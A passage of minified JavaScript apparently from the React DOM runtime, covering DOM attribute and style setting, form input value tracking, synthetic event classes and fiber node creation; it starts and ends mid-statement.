sa=Math.random().toString(36).slice(2),Ie="__reactFiber$"+sa,et="__reactProps$"+sa,Fa="__reactContainer$"+sa,Ri="__reactEvents$"+sa,Km="__reactListeners$"+sa,Vm="__reactHandles$"+sa,sr="__reactResources$"+sa,Vn="__reactMarker$"+sa;function Ai(e){delete e[Ie],delete e[et],delete e[Ri],delete e[Km],delete e[Vm]}function en(e){var t=e[Ie];if(t)return t;for(var a=e.parentNode;a;){if(t=a[Fa]||a[Ie]){if(a=t.alternate,t.child!==null||a!==null&&a.child!==null)for(e=Cf(e);e!==null;){if(a=e[Ie])return a;e=Cf(e)}return t}e=a,a=e.parentNode}return null}function tn(e){if(e=e[Ie]||e[Fa]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function Xn(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(r(33))}function an(e){var t=e[sr];return t||(t=e[sr]={hoistableStyles:new Map,hoistableScripts:new Map}),t}function Ve(e){e[Vn]=!0}var ir=new Set,or={};function La(e,t){nn(e,t),nn(e+"Capture",t)}function nn(e,t){for(or[e]=t,e=0;e<t.length;e++)ir.add(t[e])}var Xm=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),cr={},rr={};function Im(e){return vi.call(rr,e)?!0:vi.call(cr,e)?!1:Xm.test(e)?rr[e]=!0:(cr[e]=!0,!1)}function Kl(e,t,a){if(Im(t))if(a===null)e.removeAttribute(t);else{switch(typeof a){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var n=t.toLowerCase().slice(0,5);if(n!=="data-"&&n!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,""+a)}}function Vl(e,t,a){if(a===null)e.removeAttribute(t);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,""+a)}}function Ht(e,t,a,n){if(n===null)e.removeAttribute(a);else{switch(typeof n){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(a);return}e.setAttributeNS(t,a,""+n)}}function vt(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function ur(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Zm(e,t,a){var n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var l=n.get,s=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return l.call(this)},set:function(i){a=""+i,s.call(this,i)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return a},setValue:function(i){a=""+i},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function xi(e){if(!e._valueTracker){var t=ur(e)?"checked":"value";e._valueTracker=Zm(e,t,""+e[t])}}function dr(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var a=t.getValue(),n="";return e&&(n=ur(e)?e.checked?"true":"false":e.value),e=n,e!==a?(t.setValue(e),!0):!1}function Xl(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var $m=/[\n"\\]/g;function St(e){return e.replace($m,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function Ci(e,t,a,n,l,s,i,c){e.name="",i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"?e.type=i:e.removeAttribute("type"),t!=null?i==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+vt(t)):e.value!==""+vt(t)&&(e.value=""+vt(t)):i!=="submit"&&i!=="reset"||e.removeAttribute("value"),t!=null?Oi(e,i,vt(t)):a!=null?Oi(e,i,vt(a)):n!=null&&e.removeAttribute("value"),l==null&&s!=null&&(e.defaultChecked=!!s),l!=null&&(e.checked=l&&typeof l!="function"&&typeof l!="symbol"),c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"?e.name=""+vt(c):e.removeAttribute("name")}function fr(e,t,a,n,l,s,i,c){if(s!=null&&typeof s!="function"&&typeof s!="symbol"&&typeof s!="boolean"&&(e.type=s),t!=null||a!=null){if(!(s!=="submit"&&s!=="reset"||t!=null)){xi(e);return}a=a!=null?""+vt(a):"",t=t!=null?""+vt(t):a,c||t===e.value||(e.value=t),e.defaultValue=t}n=n??l,n=typeof n!="function"&&typeof n!="symbol"&&!!n,e.checked=c?e.checked:!!n,e.defaultChecked=!!n,i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"&&(e.name=i),xi(e)}function Oi(e,t,a){t==="number"&&Xl(e.ownerDocument)===e||e.defaultValue===""+a||(e.defaultValue=""+a)}function ln(e,t,a,n){if(e=e.options,t){t={};for(var l=0;l<a.length;l++)t["$"+a[l]]=!0;for(a=0;a<e.length;a++)l=t.hasOwnProperty("$"+e[a].value),e[a].selected!==l&&(e[a].selected=l),l&&n&&(e[a].defaultSelected=!0)}else{for(a=""+vt(a),t=null,l=0;l<e.length;l++){if(e[l].value===a){e[l].selected=!0,n&&(e[l].defaultSelected=!0);return}t!==null||e[l].disabled||(t=e[l])}t!==null&&(t.selected=!0)}}function mr(e,t,a){if(t!=null&&(t=""+vt(t),t!==e.value&&(e.value=t),a==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=a!=null?""+vt(a):""}function pr(e,t,a,n){if(t==null){if(n!=null){if(a!=null)throw Error(r(92));if(qe(n)){if(1<n.length)throw Error(r(93));n=n[0]}a=n}a==null&&(a=""),t=a}a=vt(t),e.defaultValue=a,n=e.textContent,n===a&&n!==""&&n!==null&&(e.value=n),xi(e)}function sn(e,t){if(t){var a=e.firstChild;if(a&&a===e.lastChild&&a.nodeType===3){a.nodeValue=t;return}}e.textContent=t}var Wm=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function hr(e,t,a){var n=t.indexOf("--")===0;a==null||typeof a=="boolean"||a===""?n?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":n?e.setProperty(t,a):typeof a!="number"||a===0||Wm.has(t)?t==="float"?e.cssFloat=a:e[t]=(""+a).trim():e[t]=a+"px"}function gr(e,t,a){if(t!=null&&typeof t!="object")throw Error(r(62));if(e=e.style,a!=null){for(var n in a)!a.hasOwnProperty(n)||t!=null&&t.hasOwnProperty(n)||(n.indexOf("--")===0?e.setProperty(n,""):n==="float"?e.cssFloat="":e[n]="");for(var l in t)n=t[l],t.hasOwnProperty(l)&&a[l]!==n&&hr(e,l,n)}else for(var s in t)t.hasOwnProperty(s)&&hr(e,s,t[s])}function Di(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Jm=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),Pm=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function Il(e){return Pm.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function Gt(){}var ki=null;function wi(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var on=null,cn=null;function yr(e){var t=tn(e);if(t&&(e=t.stateNode)){var a=e[et]||null;e:switch(e=t.stateNode,t.type){case"input":if(Ci(e,a.value,a.defaultValue,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name),t=a.name,a.type==="radio"&&t!=null){for(a=e;a.parentNode;)a=a.parentNode;for(a=a.querySelectorAll('input[name="'+St(""+t)+'"][type="radio"]'),t=0;t<a.length;t++){var n=a[t];if(n!==e&&n.form===e.form){var l=n[et]||null;if(!l)throw Error(r(90));Ci(n,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name)}}for(t=0;t<a.length;t++)n=a[t],n.form===e.form&&dr(n)}break e;case"textarea":mr(e,a.value,a.defaultValue);break e;case"select":t=a.value,t!=null&&ln(e,!!a.multiple,t,!1)}}}var Mi=!1;function vr(e,t,a){if(Mi)return e(t,a);Mi=!0;try{var n=e(t);return n}finally{if(Mi=!1,(on!==null||cn!==null)&&(Ns(),on&&(t=on,e=cn,cn=on=null,yr(t),e)))for(t=0;t<e.length;t++)yr(e[t])}}function In(e,t){var a=e.stateNode;if(a===null)return null;var n=a[et]||null;if(n===null)return null;a=n[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(n=!n.disabled)||(e=e.type,n=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!n;break e;default:e=!1}if(e)return null;if(a&&typeof a!="function")throw Error(r(231,t,typeof a));return a}var Qt=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Li=!1;if(Qt)try{var Zn={};Object.defineProperty(Zn,"passive",{get:function(){Li=!0}}),window.addEventListener("test",Zn,Zn),window.removeEventListener("test",Zn,Zn)}catch{Li=!1}var ia=null,Ni=null,Zl=null;function Sr(){if(Zl)return Zl;var e,t=Ni,a=t.length,n,l="value"in ia?ia.value:ia.textContent,s=l.length;for(e=0;e<a&&t[e]===l[e];e++);var i=a-e;for(n=1;n<=i&&t[a-n]===l[s-n];n++);return Zl=l.slice(e,1<n?1-n:void 0)}function $l(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Wl(){return!0}function br(){return!1}function tt(e){function t(a,n,l,s,i){this._reactName=a,this._targetInst=l,this.type=n,this.nativeEvent=s,this.target=i,this.currentTarget=null;for(var c in e)e.hasOwnProperty(c)&&(a=e[c],this[c]=a?a(s):s[c]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?Wl:br,this.isPropagationStopped=br,this}return O(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var a=this.nativeEvent;a&&(a.preventDefault?a.preventDefault():typeof a.returnValue!="unknown"&&(a.returnValue=!1),this.isDefaultPrevented=Wl)},stopPropagation:function(){var a=this.nativeEvent;a&&(a.stopPropagation?a.stopPropagation():typeof a.cancelBubble!="unknown"&&(a.cancelBubble=!0),this.isPropagationStopped=Wl)},persist:function(){},isPersistent:Wl}),t}var Na={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Jl=tt(Na),$n=O({},Na,{view:0,detail:0}),Fm=tt($n),qi,Ui,Wn,Pl=O({},$n,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Bi,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Wn&&(Wn&&e.type==="mousemove"?(qi=e.screenX-Wn.screenX,Ui=e.screenY-Wn.screenY):Ui=qi=0,Wn=e),qi)},movementY:function(e){return"movementY"in e?e.movementY:Ui}}),Er=tt(Pl),ep=O({},Pl,{dataTransfer:0}),tp=tt(ep),ap=O({},$n,{relatedTarget:0}),zi=tt(ap),np=O({},Na,{animationName:0,elapsedTime:0,pseudoElement:0}),lp=tt(np),sp=O({},Na,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),ip=tt(sp),op=O({},Na,{data:0}),Tr=tt(op),cp={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},rp={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},up={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function dp(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=up[e])?!!t[e]:!1}function Bi(){return dp}var fp=O({},$n,{key:function(e){if(e.key){var t=cp[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=$l(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?rp[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Bi,charCode:function(e){return e.type==="keypress"?$l(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?$l(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),mp=tt(fp),pp=O({},Pl,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),_r=tt(pp),hp=O({},$n,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Bi}),gp=tt(hp),yp=O({},Na,{propertyName:0,elapsedTime:0,pseudoElement:0}),vp=tt(yp),Sp=O({},Pl,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),bp=tt(Sp),Ep=O({},Na,{newState:0,oldState:0}),Tp=tt(Ep),_p=[9,13,27,32],ji=Qt&&"CompositionEvent"in window,Jn=null;Qt&&"documentMode"in document&&(Jn=document.documentMode);var Rp=Qt&&"TextEvent"in window&&!Jn,Rr=Qt&&(!ji||Jn&&8<Jn&&11>=Jn),Ar=" ",xr=!1;function Cr(e,t){switch(e){case"keyup":return _p.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Or(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var rn=!1;function Ap(e,t){switch(e){case"compositionend":return Or(t);case"keypress":return t.which!==32?null:(xr=!0,Ar);case"textInput":return e=t.data,e===Ar&&xr?null:e;default:return null}}function xp(e,t){if(rn)return e==="compositionend"||!ji&&Cr(e,t)?(e=Sr(),Zl=Ni=ia=null,rn=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Rr&&t.locale!=="ko"?null:t.data;default:return null}}var Cp={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Dr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Cp[e.type]:t==="textarea"}function kr(e,t,a,n){on?cn?cn.push(n):cn=[n]:on=n,t=Gs(t,"onChange"),0<t.length&&(a=new Jl("onChange","change",null,a,n),e.push({event:a,listeners:t}))}var Pn=null,Fn=null;function Op(e){mf(e,0)}function Fl(e){var t=Xn(e);if(dr(t))return e}function wr(e,t){if(e==="change")return t}var Mr=!1;if(Qt){var Hi;if(Qt){var Gi="oninput"in document;if(!Gi){var Lr=document.createElement("div");Lr.setAttribute("oninput","return;"),Gi=typeof Lr.oninput=="function"}Hi=Gi}else Hi=!1;Mr=Hi&&(!document.documentMode||9<document.documentMode)}function Nr(){Pn&&(Pn.detachEvent("onpropertychange",qr),Fn=Pn=null)}function qr(e){if(e.propertyName==="value"&&Fl(Fn)){var t=[];kr(t,Fn,e,wi(e)),vr(Op,t)}}function Dp(e,t,a){e==="focusin"?(Nr(),Pn=t,Fn=a,Pn.attachEvent("onpropertychange",qr)):e==="focusout"&&Nr()}function kp(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Fl(Fn)}function wp(e,t){if(e==="click")return Fl(t)}function Mp(e,t){if(e==="input"||e==="change")return Fl(t)}function Lp(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var ut=typeof Object.is=="function"?Object.is:Lp;function el(e,t){if(ut(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var a=Object.keys(e),n=Object.keys(t);if(a.length!==n.length)return!1;for(n=0;n<a.length;n++){var l=a[n];if(!vi.call(t,l)||!ut(e[l],t[l]))return!1}return!0}function Ur(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function zr(e,t){var a=Ur(e);e=0;for(var n;a;){if(a.nodeType===3){if(n=e+a.textContent.length,e<=t&&n>=t)return{node:a,offset:t-e};e=n}e:{for(;a;){if(a.nextSibling){a=a.nextSibling;break e}a=a.parentNode}a=void 0}a=Ur(a)}}function Br(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Br(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function jr(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Xl(e.document);t instanceof e.HTMLIFrameElement;){try{var a=typeof t.contentWindow.location.href=="string"}catch{a=!1}if(a)e=t.contentWindow;else break;t=Xl(e.document)}return t}function Qi(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var Np=Qt&&"documentMode"in document&&11>=document.documentMode,un=null,Yi=null,tl=null,Ki=!1;function Hr(e,t,a){var n=a.window===a?a.document:a.nodeType===9?a:a.ownerDocument;Ki||un==null||un!==Xl(n)||(n=un,"selectionStart"in n&&Qi(n)?n={start:n.selectionStart,end:n.selectionEnd}:(n=(n.ownerDocument&&n.ownerDocument.defaultView||window).getSelection(),n={anchorNode:n.anchorNode,anchorOffset:n.anchorOffset,focusNode:n.focusNode,focusOffset:n.focusOffset}),tl&&el(tl,n)||(tl=n,n=Gs(Yi,"onSelect"),0<n.length&&(t=new Jl("onSelect","select",null,t,a),e.push({event:t,listeners:n}),t.target=un)))}function qa(e,t){var a={};return a[e.toLowerCase()]=t.toLowerCase(),a["Webkit"+e]="webkit"+t,a["Moz"+e]="moz"+t,a}var dn={animationend:qa("Animation","AnimationEnd"),animationiteration:qa("Animation","AnimationIteration"),animationstart:qa("Animation","AnimationStart"),transitionrun:qa("Transition","TransitionRun"),transitionstart:qa("Transition","TransitionStart"),transitioncancel:qa("Transition","TransitionCancel"),transitionend:qa("Transition","TransitionEnd")},Vi={},Gr={};Qt&&(Gr=document.createElement("div").style,"AnimationEvent"in window||(delete dn.animationend.animation,delete dn.animationiteration.animation,delete dn.animationstart.animation),"TransitionEvent"in window||delete dn.transitionend.transition);function Ua(e){if(Vi[e])return Vi[e];if(!dn[e])return e;var t=dn[e],a;for(a in t)if(t.hasOwnProperty(a)&&a in Gr)return Vi[e]=t[a];return e}var Qr=Ua("animationend"),Yr=Ua("animationiteration"),Kr=Ua("animationstart"),qp=Ua("transitionrun"),Up=Ua("transitionstart"),zp=Ua("transitioncancel"),Vr=Ua("transitionend"),Xr=new Map,Xi="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");Xi.push("scrollEnd");function Ot(e,t){Xr.set(e,t),La(t,[e])}var es=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},bt=[],fn=0,Ii=0;function ts(){for(var e=fn,t=Ii=fn=0;t<e;){var a=bt[t];bt[t++]=null;var n=bt[t];bt[t++]=null;var l=bt[t];bt[t++]=null;var s=bt[t];if(bt[t++]=null,n!==null&&l!==null){var i=n.pending;i===null?l.next=l:(l.next=i.next,i.next=l),n.pending=l}s!==0&&Ir(a,l,s)}}function as(e,t,a,n){bt[fn++]=e,bt[fn++]=t,bt[fn++]=a,bt[fn++]=n,Ii|=n,e.lanes|=n,e=e.alternate,e!==null&&(e.lanes|=n)}function Zi(e,t,a,n){return as(e,t,a,n),ns(e)}function za(e,t){return as(e,null,null,t),ns(e)}function Ir(e,t,a){e.lanes|=a;var n=e.alternate;n!==null&&(n.lanes|=a);for(var l=!1,s=e.return;s!==null;)s.childLanes|=a,n=s.alternate,n!==null&&(n.childLanes|=a),s.tag===22&&(e=s.stateNode,e===null||e._visibility&1||(l=!0)),e=s,s=s.return;return e.tag===3?(s=e.stateNode,l&&t!==null&&(l=31-rt(a),e=s.hiddenUpdates,n=e[l],n===null?e[l]=[t]:n.push(t),t.lane=a|536870912),s):null}function ns(e){if(50<_l)throw _l=0,lc=null,Error(r(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var mn={};function Bp(e,t,a,n){this.tag=e,this.key=a,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=n,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function dt(e,t,a,n){return new Bp(e,t,a,n)}function $i(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Yt(e,t){var a=e.alternate;return a===null?(a=dt(e.tag,t,e.key,e.mode),a.elementType=e.elementType,a.type=e.type,a.stateNode=e.stateNode,a.alternate=e,e.alternate=a):(a.pendingProps=t,a.type=e.type,a.flags=0,a.subtreeFlags=0,a.deletions=null),a.flags=e.flags&65011712,a.childLanes=e.childLanes,a.lanes=e.lanes,a.child=e.child,a.memoizedProps=e.memoizedProps,a.memoizedState=e.memoizedState,a.updateQueue=e.updateQueue,t=e.dependencies,a.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},a.sibling=e.sibling,a.index=e.index,a.ref=e.ref,a.refCleanup=e.refCleanup,a}function Zr(e,t){e.flags&=65011714;var a=e.alternate;return a===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=a.childLanes,e.lanes=a.lanes,e.child=a.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=a.memoizedProps,e.memoizedState=a.memoizedState,e.updateQueue=a.updateQueue,e.type=a.type,t=a.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function ls(e,t,a,n,l,s){var i=0;if(n=e,typeof e=="function")$i(e)&&(i=1);else if(typeof e=="string")i=Yh(e,a,G.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case Ne:return e=dt(31,a,t,l),e.elementType=Ne,e.lanes=s,e;case $:return Ba(a.children,l,s,t);case ae:i=8,l|=24;break;case W:return e=dt(12,a,t,l|2),e.elementType=W,e.lanes=s,e;case le:return e=dt(13,a,t,l),e.elementType=le,e.lanes=s,e;case ge:return e=dt(19,a,t,l),e.elementType=ge,e.lanes=s,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case P:i=10;break e;case ne:i=9;break e;case ie:i=11;break e;case I:i=14;break e;case _e:i=16,n=null;break e}i=29,a=Error(r(130,e===null?"null":typeof e,"")),n=null}return t=dt(i,a,t,l),t.elementType=e,t.type=n,t.lanes=s,t}function Ba(e,t,a,n){return e=dt(7,e,n,t),e.lanes=a,e}function Wi(e,t,a){return e=dt(6,e,null,t),e.lanes=a,e}function $r(e){var t=dt(18,null,null,0);return t.stateNode=e,t}function Ji(e,t,a){return t=dt(4,e.children!==null?e.children:[],e.key,t),t.lanes=a,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var Wr=new WeakMap;function Et(e,t){if(typeof e=="object"&&e!==null){var a=Wr.get(e);return a!==void 0?a:(t={value:e,source:t,stack:$c(t)},Wr.set(e,t),t)}return{value:e,source:t,stack:$c(t)}}var pn=[],hn=0,ss=null,al=0,Tt=[],_t=0,oa=null,Lt=1,Nt="";function Kt(e,t){pn[hn++]=al,pn[hn++]=ss,ss=e,al=t}function Jr(e,t,a){Tt[_t++]=Lt,Tt[_t++]=Nt,Tt[_t++]=oa,oa=e;var n=Lt;e=Nt;var l=32-rt(n)-1;n&=~(1<<l),a+=1;var s=32-rt(t)+l;if(30<s){var 